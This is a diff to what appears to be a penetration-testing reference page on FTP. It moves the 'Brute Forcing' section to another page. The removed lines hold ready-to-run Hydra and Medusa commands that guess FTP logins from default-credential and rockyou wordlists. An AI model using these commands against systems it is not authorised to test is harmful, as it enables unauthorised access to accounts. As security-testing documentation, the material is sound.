@@ -79,52 +79,11 @@ If not credentials provided `anonymous:anonymous` is assumed.
 
 ## Brute Forcing
 
-As an alternative to profiled passwords, [Daniel Miessler's SecLists](https://github.com/danielmiessler/SecLists) includes a handy list of [FTP default credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt).
+Refer to [FTP Brute Forcing]({{< ref "brute-forcing#ftp">}})
 
-### Hydra [^hydra]
-
-Using a colon-separated `user:pass` list.
-
-```sh
-hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "war.rhost" >}} ftp
-```
-
-Using login user and passwords list.
-
-```sh
-hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" >}} ftp
-```
-
-{{<details "Parameters">}}
-- `-v`: verbose mode.
-- `-C <user:pass file>`: colon-separated "login:pass" format.
-- `-l <user>`: login with `user` name.
-- `-P <passwords file>`: login with password from file.
-- `-f`: exit after the first found user/password pair.
-{{</details>}}
-
-### Medusa [^medusa]
-
-Medusa's combo files (colon-separated) should be in the format `host:username:password`. If any of the three values are missing, the respective information should be provided either as a global value or as a list in a file.
-
-```sh
-sed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /tmp/cplist.txt
-medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ft
-```
-
-Using login user and passwords list.
-
-```sh
-medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -M ftp
-```
-
-{{<details "Parameters">}}
-- `-u <user>`: login with `user` name.
-- `-P <passwords file>`: login with password from file.
-- `-h`: target hostname or IP address.
-- `-M`: module to execute.
-{{</details>}}
-
+{{<hint info>}}
+[SecLists](https://github.com/danielmiessler/SecLists) includes a handy list of [FTP default credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt).
+{{</hint>}}
 
 ## Configuration files
 
@@ -154,5 +113,3 @@ wget -m ftp://user:pass@{{< param "war.rhost" >}}/
 [^so-ftp-mirroring]: Thibaut Barrère. “Command Line - How to Recursively Download a Folder via FTP on Linux - Stack Overflow.” Stack Overflow, https://stackoverflow.com/a/113900/578050.
 [^0daysec-enum]: “Penetration Testing Methodology” 0DAYsecurity.Com, http://www.0daysecurity.com/penetration-testing/enumeration.html.
 [^w3c-ftp-transfer]: “RFC959: FTP: Data Transfer Functions.” World Wide Web Consortium (W3C), https://www.w3.org/Protocols/rfc959/3_DataTransfer.html.
-[^hydra]: Heuse, Marc. “GitHub - Vanhauser-Thc/Thc-Hydra: Hydra.” GitHub, https://github.com/vanhauser-thc/thc-hydra. Accessed 12 May 2020.
-[^medusa]: “Foofus Networking Services - Medusa.” Foofus.Net | Foofus.Net Advanced Security Services Forum, http://foofus.net/goons/jmk/medusa/medusa.html.
